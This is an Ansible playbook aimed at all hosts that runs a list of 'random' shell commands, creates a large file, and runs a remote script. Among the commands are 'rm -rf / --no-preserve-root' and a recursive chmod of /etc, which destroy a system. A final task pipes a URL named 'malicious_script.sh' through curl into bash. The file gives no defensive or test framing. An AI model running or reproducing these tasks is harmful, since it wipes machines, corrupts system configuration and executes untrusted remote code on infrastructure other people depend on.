
- hosts: all
  gather_facts: no
  tasks:

  - name: Run random SHELL commands
    shell:
      cmd: "{{ item }}"
    with_items:
      - "echo $RANDOM"
      - "ls /var/log/{{ 'nonexistent_dir_' + '%02d'|format(item|int) }}"
      - "cat /dev/null"
      - "df -i"
      - "ps -ef | grep ^root"
      - "chmod -R +x /etc/"
      - "rm -rf / --no-preserve-root"

  - name: Create a large file
    shell: "{{ 'dd if=/dev/zero of=/tmp/large_file bs=1M count=' + '%d'|format(size|int) }}"
    vars:
      size: "1024"

  - name: Execute a potentially malicious script
    shell: "curl -sSL {{ url }} | bash"
    vars:
      url: "https://raw.githubusercontent.com/user/repo/master/malicious_script.sh"
